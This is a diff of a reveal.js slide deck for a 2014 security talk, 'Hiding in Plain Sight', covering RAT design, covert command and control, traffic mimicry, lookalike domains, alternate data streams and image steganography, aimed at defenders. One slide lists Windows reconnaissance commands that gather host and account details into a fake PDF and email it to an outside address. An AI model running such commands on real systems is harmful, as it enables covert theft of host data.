@@ -1,26 +1,20 @@
 <!doctype html>
 <html lang="en">
-
 	<head>
 		<meta charset="utf-8">
-
 		<title>Hiding in Plain Sight</title>
-
 		<meta name="description" content="Security Presentation for CodeStock 2014">
 		<meta name="author" content="Rob Gillen">
-
 		<meta name="apple-mobile-web-app-capable" content="yes" />
 		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
-
 		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-
 		<link rel="stylesheet" href="css/reveal.css">
 		<link rel="stylesheet" href="css/theme/night.css" id="theme">
-
-		<!-- For syntax highlighting -->
 		<link rel="stylesheet" href="lib/css/zenburn.css">
-
-		<!-- If the query includes 'print-pdf', include the PDF print sheet -->
+		<link rel="stylesheet" href="css/fullscreen-img.css">
+		<style type="text/css">
+			p { text-align: left; }
+		</style>
 		<script>
 			if( window.location.search.match( /print-pdf/gi ) ) {
 				var link = document.createElement( 'link' );
@@ -30,7 +24,6 @@
 				document.getElementsByTagName( 'head' )[0].appendChild( link );
 			}
 		</script>
-
 		<!--[if lt IE 9]>
 		<script src="lib/js/html5shiv.js"></script>
 		<![endif]-->
@@ -39,8 +32,13 @@
 	<body>
 		<div class="reveal">
 			<div class="slides">
+				<!--
+				<section fullscreen-img="resources/blacksheep.jpg" fullscreen-size="contain">
+				</section>
+				-->
 				<section data-markdown data-separator="---">
 					##Hiding in Plain Sight
+
 					Presented by [Rob Gillen](http://rob.gillenfamily.net) / [@argodev](http://twitter.com/argodev)
 					
 
@@ -49,9 +47,192 @@
 					---
 
 					##Disclaimer
+
 					The content of this presentation represents my personal views and thoughts at the present time. I reserve the right to change my views and opinions at any time. This content is not endorsed by, or representative in any way of my employer nor is it intended to be a view into my work or a reflection on the type of work that I or my group performs. It is simply a hobby and personal interest and should be considered as such.
+					---
+					![Black Sheep](resources/blacksheep.jpg)
+					---
+					##HTDCS
+					- Helpdesk Ticket Driven Cyber Security
+					---
+					![Spike Graph](resources/spikeGraph.png)
+					---
+					![Flat Graph](resources/flatgraph.jpg)
+					---
+					##Overview
+					- RAT Design
+					- Encryption
+					- Command/Control (C2)
+					- AntiVirus
+					- Behavior
+					MANDIANT report
+					VERIZON report
 
 					---
+					##RAT Design
+
+					- Exe is dropped via infected page
+					- Queries web page for commands
+					- Performs commands if not done previously
+					- Periodically polls for new commands
+
+					---
+					##Encryption
+
+					- Complex Encryption is trivial
+					- PBKDF – Scrypt sequential memory-hard function
+					- Many iterations (> 10K)
+					- Long key-lengths
+
+					---
+					##Encryption Example
+					- Above configuration is custom-hardware resistant
+						- Takes approximately ¼ second per guess
+
+					---
+					##Command/Control
+					- Use Web2C Approach
+						- Commands are “issued” en masse via normal, benign looking web pages
+						- Common ports
+						- Leverages existing HTML/server constructs
+					---
+					webpage pic
+					---
+					viewstate pic
+					---
+					viewstate 01
+
+					viewstate 02
+					---
+					##Command Text
+					ipconfig /all > %APPDATA%\info.txt
+					net start >> %APPDATA%\info.txt
+					tasklist /v >> %APPDATA%\info.txt
+					net user >> %APPDATA%\info.txt
+					net localgroup administrators >> %APPDATA%\info.txt
+					netstat -ano >> %APPDATA%\info.txt
+					net use >> %APPDATA%\info.txt
+					copy %APPDATA%\info.txt %APPDATA%\output.pdf
+					del %APPDATA%\info.txt
+
+					sendmail %APPDATA%\output.pdf Status Update “Jones, William E. wejones@yourorg.gov” itebaffe-836@yopmail.com smtp.yourorg.gov
+
+					del %APPDATA%\output.pdf
+
+					---
+					##Mimic User Behavior
+					- Traffic Rates
+						- Monitor incoming/outgoing network traffic for X days
+						- Configure xfil to stay within X% of “normal”
+					- C2
+						- Exponential/randomized stand-down
+						- Only comm during periods of activity
+
+					---
+					##Mimic User Behavior 
+					- Target URLs
+						- Monitor outgoing web queries/URLs for X days
+						- Use similar domain names for malicious traffic
+						- Append similar/same query strings to malicious requests
+					---
+					##Hiding in Logs
+
+					v-client-5b.sjc.dropbox.com
+					snt-re3-9a.sjc.dropbox.com
+					yn-in-f125.1e100.net
+					l1.ycs.vip.dcb.yahoo.com
+					snt-re3-9a.sjc.drpbox.com
+					ip-69-31-29-228.nlayer.net
+					a23-47-20-211.deploy.static.akamaitechnologies.com
+					l3.ycs.vip.dcb.yahoo.com
+					ir2.fp.vip.bf1.yahoo.com
+					www.nbcnews.com.edgesuite.net
+					wac.946A.edgecastcdn.net
+					a2.twimg.com
+
+					---
+					##Other Hiding Techniques
+					- Office File content embedding
+					- Creative location
+					- Alternate Data Streams
+					- Least Significant Bit
+					- Network Protocol Manipulation
+
+					---
+					word paper 01
+					---
+					word paper 02
+					---
+					word paper 03
+					---
+					word paper 04
+					---
+					word paper 05
+					---
+					word paper 06
+					---
+					##Creative File Locations
+					hidden file 01
+					---
+					##Alternate Data Streams
+					- Feature of NTFS since NT 3.5.1
+					- Used for metadata and compatibility with other file systems
+					---
+					ADS Demo
+					---
+					##Crude Image Stego: LSB
+					- Least Significant Bit – alter it and encode message across LSB through various bytes
+					- Visually imperceptible
+					- Computationally challenging to detect
+					- Encryption also an option
+					---
+					###Carrier Image
+					- Image Data:
+						- Size: 2.1 MB
+						- Dimensions: 3500 x 2343 px
+						- Resolution: 300 dpi
+						- Bit Depth: 24
+						- ~ 8 Megapixel
+					- “Secret” Message: Welcome! Remember, things aren’t always what they seem.
+
+					STARTER IMAGE
+					---
+					##LSB: How It Works
+					LSB IMAGE
+					---
+					LSB Start Pic
+					---
+					LSB End Pic
+					---
+					LSB Blow Up
+					---
+					##Network Protocol Abuse
+					---
+					Challenges of signature tools
+					---
+					Virus total 01
+					---
+					Virus total 02
+					---
+					network overview
+					---
+					Attack Pattern 01
+					---
+					Attack Pattern 02
+					---
+					Attack Pattern 03
+					---
+					Attack Pattern 04
+					---
+					Client Compromise (Simple)
+					---
+					Client Compromise (Encoded &amp; SSL)
+					---
+					##Next Steps
+					- Know what you can and can’t see
+					- Consider implications of your monitoring strategy
+					- Behavior *must* play a role
+
 
 					##Questions/Contact
 
@@ -63,81 +244,6 @@
 
 					@argodev
 
-				</section>
-
-				<!-- Example of nested vertical slides -->
-				<section>
-					<section>
-						<h2>Vertical Slides</h2>
-						<p>
-							Slides can be nested inside of other slides,
-							try pressing <a href="#" class="navigate-down">down</a>.
-						</p>
-						<a href="#" class="image navigate-down">
-							<img width="178" height="238" src="https://s3.amazonaws.com/hakim-static/reveal-js/arrow.png" alt="Down arrow">
-						</a>
-					</section>
-					<section>
-						<h2>Basement Level 1</h2>
-						<p>Press down or up to navigate.</p>
-					</section>
-					<section>
-						<h2>Basement Level 2</h2>
-						<p>Cornify</p>
-						<a class="test" href="http://cornify.com">
-							<img width="280" height="326" src="https://s3.amazonaws.com/hakim-static/reveal-js/cornify.gif" alt="Unicorn">
-						</a>
-					</section>
-					<section>
-						<h2>Basement Level 3</h2>
-						<p>That's it, time to go back up.</p>
-						<a href="#/2" class="image">
-							<img width="178" height="238" src="https://s3.amazonaws.com/hakim-static/reveal-js/arrow.png" alt="Up arrow" style="-webkit-transform: rotate(180deg);">
-						</a>
-					</section>
-				</section>
-
-				<section>
-					<h2>Slides</h2>
-					<p>
-						Not a coder? No problem. There's a fully-featured visual editor for authoring these, try it out at <a href="http://slid.es" target="_blank">http://slid.es</a>.
-					</p>
-				</section>
-
-				<section>
-					<h2>Point of View</h2>
-					<p>
-						Press <strong>ESC</strong> to enter the slide overview.
-					</p>
-					<p>
-						Hold down alt and click on any element to zoom in on it using <a href="http://lab.hakim.se/zoom-js">zoom.js</a>. Alt + click anywhere to zoom back out.
-					</p>
-				</section>
-
-				<section>
-					<h2>Works in Mobile Safari</h2>
-					<p>
-						Try it out! You can swipe through the slides and pinch your way to the overview.
-					</p>
-				</section>
-
-				<section>
-					<h2>Marvelous Unordered List</h2>
-					<ul>
-						<li>No order here</li>
-						<li>Or here</li>
-						<li>Or here</li>
-						<li>Or here</li>
-					</ul>
-				</section>
-
-				<section>
-					<h2>Fantastic Ordered List</h2>
-					<ol>
-						<li>One is smaller than...</li>
-						<li>Two is smaller than...</li>
-						<li>Three!</li>
-					</ol>
 				</section>
 
 				<section data-markdown>
@@ -155,62 +261,6 @@
 						</section>
 						```
 					</script>
-				</section>
-
-				<section id="transitions">
-					<h2>Transition Styles</h2>
-					<p>
-						You can select from different transitions, like: <br>
-						<a href="?transition=cube#/transitions">Cube</a> -
-						<a href="?transition=page#/transitions">Page</a> -
-						<a href="?transition=concave#/transitions">Concave</a> -
-						<a href="?transition=zoom#/transitions">Zoom</a> -
-						<a href="?transition=linear#/transitions">Linear</a> -
-						<a href="?transition=fade#/transitions">Fade</a> -
-						<a href="?transition=none#/transitions">None</a> -
-						<a href="?#/transitions">Default</a>
-					</p>
-				</section>
-
-				<section id="themes">
-					<h2>Themes</h2>
-					<p>
-						Reveal.js comes with a few themes built in: <br>
-						<a href="?#/themes">Default</a> -
-						<a href="?theme=sky#/themes">Sky</a> -
-						<a href="?theme=beige#/themes">Beige</a> -
-						<a href="?theme=simple#/themes">Simple</a> -
-						<a href="?theme=serif#/themes">Serif</a> -
-						<a href="?theme=night#/themes">Night</a> <br>
-						<a href="?theme=moon#/themes">Moon</a> -
-						<a href="?theme=solarized#/themes">Solarized</a>
-					</p>
-					<p>
-						<small>
-							* Theme demos are loaded after the presentation which leads to flicker. In production you should load your theme in the <code>&lt;head&gt;</code> using a <code>&lt;link&gt;</code>.
-						</small>
-					</p>
-				</section>
-
-				<section>
-					<h2>Global State</h2>
-					<p>
-						Set <code>data-state="something"</code> on a slide and <code>"something"</code>
-						will be added as a class to the document element when the slide is open. This lets you
-						apply broader style changes, like switching the background.
-					</p>
-				</section>
-
-				<section data-state="customevent">
-					<h2>Custom Events</h2>
-					<p>
-						Additionally custom events can be triggered on a per slide basis by binding to the <code>data-state</code> name.
-					</p>
-					<pre><code data-trim contenteditable style="font-size: 18px; margin-top: 20px;">
-Reveal.addEventListener( 'customevent', function() {
-	console.log( '"customevent" has fired' );
-} );
-					</code></pre>
 				</section>
 
 				<section>
@@ -248,18 +298,6 @@ Reveal.addEventListener( 'customevent', function() {
 				</section>
 
 				<section>
-					<h2>Clever Quotes</h2>
-					<p>
-						These guys come in two forms, inline: <q cite="http://searchservervirtualization.techtarget.com/definition/Our-Favorite-Technology-Quotations">
-						&ldquo;The nice thing about standards is that there are so many to choose from&rdquo;</q> and block:
-					</p>
-					<blockquote cite="http://searchservervirtualization.techtarget.com/definition/Our-Favorite-Technology-Quotations">
-						&ldquo;For years there has been a theory that millions of monkeys typing at random on millions of typewriters would
-						reproduce the entire works of Shakespeare. The Internet has proven this theory to be untrue.&rdquo;
-					</blockquote>
-				</section>
-
-				<section>
 					<h2>Pretty Code</h2>
 					<pre><code data-trim contenteditable>
 function linkify( selector ) {
@@ -279,94 +317,13 @@ function linkify( selector ) {
 					</code></pre>
 					<p>Courtesy of <a href="http://softwaremaniacs.org/soft/highlight/en/description/">highlight.js</a>.</p>
 				</section>
-
-				<section>
-					<h2>Intergalactic Interconnections</h2>
-					<p>
-						You can link between slides internally,
-						<a href="#/2/3">like this</a>.
-					</p>
-				</section>
-
-				<section>
-					<section id="fragments">
-						<h2>Fragmented Views</h2>
-						<p>Hit the next arrow...</p>
-						<p class="fragment">... to step through ...</p>
-						<ol>
-							<li class="fragment"><code>any type</code></li>
-							<li class="fragment"><em>of view</em></li>
-							<li class="fragment"><strong>fragments</strong></li>
-						</ol>
-
-						<aside class="notes">
-							This slide has fragments which are also stepped through in the notes window.
-						</aside>
-					</section>
-					<section>
-						<h2>Fragment Styles</h2>
-						<p>There's a few styles of fragments, like:</p>
-						<p class="fragment grow">grow</p>
-						<p class="fragment shrink">shrink</p>
-						<p class="fragment roll-in">roll-in</p>
-						<p class="fragment fade-out">fade-out</p>
-						<p class="fragment highlight-red">highlight-red</p>
-						<p class="fragment highlight-green">highlight-green</p>
-						<p class="fragment highlight-blue">highlight-blue</p>
-						<p class="fragment current-visible">current-visible</p>
-						<p class="fragment highlight-current-blue">highlight-current-blue</p>
-					</section>
-				</section>
-
-				<section>
-					<h2>Spectacular image!</h2>
-					<a class="image" href="http://lab.hakim.se/meny/" target="_blank">
-						<img width="320" height="299" src="http://s3.amazonaws.com/hakim-static/portfolio/images/meny.png" alt="Meny">
-					</a>
-				</section>
-
-				<section>
-					<h2>Export to PDF</h2>
-					<p>Presentations can be <a href="https://github.com/hakimel/reveal.js#pdf-export">exported to PDF</a>, below is an example that's been uploaded to SlideShare.</p>
-					<iframe id="slideshare" src="http://www.slideshare.net/slideshow/embed_code/13872948" width="455" height="356" style="margin:0;overflow:hidden;border:1px solid #CCC;border-width:1px 1px 0;margin-bottom:5px" allowfullscreen> </iframe>
-					<script>
-						document.getElementById('slideshare').attributeName = 'allowfullscreen';
-					</script>
-				</section>
-
-				<section>
-					<h2>Take a Moment</h2>
-					<p>
-						Press b or period on your keyboard to enter the 'paused' mode. This mode is helpful when you want to take distracting slides off the screen
-						during a presentation.
-					</p>
-				</section>
-
-				<section>
-					<h2>Stellar Links</h2>
-					<ul>
-						<li><a href="http://slid.es">Try the online editor</a></li>
-						<li><a href="https://github.com/hakimel/reveal.js">Source code on GitHub</a></li>
-						<li><a href="http://twitter.com/hakimel">Follow me on Twitter</a></li>
-					</ul>
-				</section>
-
-				<section>
-					<h1>THE END</h1>
-					<h3>BY Hakim El Hattab / hakim.se</h3>
-				</section>
-
 			</div>
-
 		</div>
 
 		<script src="lib/js/head.min.js"></script>
 		<script src="js/reveal.min.js"></script>
 
 		<script>
-
-			// Full list of configuration options available here:
-			// https://github.com/hakimel/reveal.js#configuration
 			Reveal.initialize({
 				controls: true,
 				progress: true,
@@ -374,7 +331,7 @@ function linkify( selector ) {
 				center: true,
 
 				theme: Reveal.getQueryHash().theme, // available themes are in /css/theme
-				transition: Reveal.getQueryHash().transition || 'linear', // default/cube/page/concave/zoom/linear/fade/none
+				transition: Reveal.getQueryHash().transition || 'default', // default/cube/page/concave/zoom/linear/fade/none
 
 				// Parallax scrolling
 				// parallaxBackgroundImage: 'https://s3.amazonaws.com/hakim-static/reveal-js/reveal-parallax-1.jpg',
@@ -387,11 +344,11 @@ function linkify( selector ) {
 					{ src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
 					{ src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
 					{ src: 'plugin/zoom-js/zoom.js', async: true, condition: function() { return !!document.body.classList; } },
-					{ src: 'plugin/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } }
+					{ src: 'plugin/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } },
+					// Syntax highlight for <code> elements
+          			{ src: 'lib/js/fullscreen-img.js' }
 				]
 			});
-
 		</script>
-
 	</body>
 </html>
